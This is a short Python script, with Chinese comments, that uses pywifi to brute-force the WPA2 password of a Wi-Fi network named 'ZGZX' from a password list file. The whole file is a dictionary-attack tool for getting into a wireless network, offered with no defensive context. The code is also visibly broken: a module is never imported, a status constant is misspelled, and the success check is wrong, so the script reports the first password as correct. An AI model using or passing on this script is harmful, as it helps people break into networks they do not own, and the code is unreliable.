#enconding:utf-8
import pywifi
import time


def WifiNet(passwd):
	wifi = pywifi.PyWiFi()
	# 抓取第一个Wi-Fi网卡
	iface = wifi.interfaces()[0]
	# 尝试断开网看
	iface.disconnect()
	time.sleep(3)

	# 查看是否断开网卡
	if iface.status() == const.IFACE_DISCONNECTED:
		# 创建Wi-Fi连接文件
		profile = pywifi.Profile()
		# 网卡名称
		profile.ssid = 'ZGZX'
		# 网卡的开放
		profile.auth = const.AUTH_ALG_OPEN
		# 设置加密类型
		profile.akm.append(const.AKM_TYPE_WPA2PSK)
		# 加密单元
		profile.cipher = const.CIPHER_TYPE_CCMP
		profile.key = passwd
		# 删除所有Wi-Fi文件
		iface.remove_all_network_profiles()
		# 设定新的连接文件
		profile_new = iface.add_network_profile(profile)
		# 连接wifi
		iface.connect(profile_new)
		time.sleep(3)
		if iface.status() == const.IFACE_CONNECTRD:
			return True
		else:
			return False
def WifiPasswd():
	wifipwd = open('passwd.txt', 'r')
	# 开始破解
	while True:
		filepwd = wifipwd.readline()
		filewd = WifiNet(filepwd)
		try:
			if filepwd:
				print("密码正确：", filepwd)
				break
			else:
				print("密码错误：", filepwd)
		except:
			continue

WifiPasswd()